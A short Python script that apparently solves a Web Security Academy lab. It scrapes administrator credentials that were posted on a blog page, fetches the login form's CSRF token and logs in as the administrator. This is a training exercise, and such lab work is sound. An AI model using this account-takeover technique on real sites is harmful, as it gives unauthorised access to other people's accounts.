import requests
from bs4 import BeautifulSoup
import re
s = requests.Session()
site = 'ac361fdb1fe44b8a80e18bb900c2003c.web-security-academy.net'

post_url = f'https://{site}/post?postId=1'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
credentials = soup.find('p', text=re.compile('administrator')).text.split(':')
print(credentials)
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'administrator',
    'password' : credentials[1]
}
resp = s.post(login_url, data=logindata)